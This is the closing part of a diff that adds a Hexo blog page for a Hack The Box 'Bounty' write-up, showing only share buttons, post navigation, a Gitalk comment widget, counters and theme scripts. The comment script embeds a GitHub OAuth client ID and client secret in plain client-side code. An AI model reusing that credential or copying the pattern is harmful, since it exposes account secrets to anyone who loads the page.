+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/04/23/Hackthebox%20-%20Jerry/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Jerry - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/04/19/Hackthebox%20-%20Sunday/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Sunday - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/&title=《Bounty - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/&title=《Bounty - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bounty - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJUlEQVR42u3a0W7CMAwFUP7/p5m0p02I9tpup5GcPFXQlByQjGPn8YjH83u8u/45jl9/fea7WY87BgYGxscynofjdenHsxLqMTKfi4GBsRsjCbLVUJgDkuuTNWNgYGAE6V2y0HxgYGBgTAJuNXWbLB0DAwNjvpToA4J7ehtgDAyMfRjzxsB913/a38DAwPiXjKs2lnkQzBmFVWFgYCzNSBK1ako3wSTPfPt8DAyMDRhXNRfvIEXJIgYGxqKMauCbFMiqi06aphgYGLsxekX5JDXMwb0vFAMDYx9G3iDMZ03SvvwgGgYGxg6MfDuaNxers6ph+tc1BgbG0oyrQm0vEFe3vidpKAYGxgaMSUOxurmtHvzCwMDAqLYk70sTq8c+MDAw9mFMUrQeIy+0FYp0GBgYSzMmCVzOTka+npPfBAMDYyFGHvJyXvXgV/78t3diYGAszaiWzJL7e0coqknkyT8GBgbGooxeWa2a8PVCarklgIGBsRCjEM7G7carCnaFtzEwMBZi5KTqsYwkvPY+JWpeYmBgLMG45XFx8tdrQhQ2sRgYGEswJi3G3hY0KcyV38XAwFiaUd1G9jau1WfmG2AMDIx9GJMDEPODGnkrtNAewMDAWJQxWVDvzskXNIrfGBgYSzOOZ41OfBxuU6M/AAwMDIxWwzLHX1DIw8DA2ICRBLi8kZkU9HttzpPDFhgYGIsyekW0fLnVIlrCvqCFiYGB8RmML+OW+ghtUlQFAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
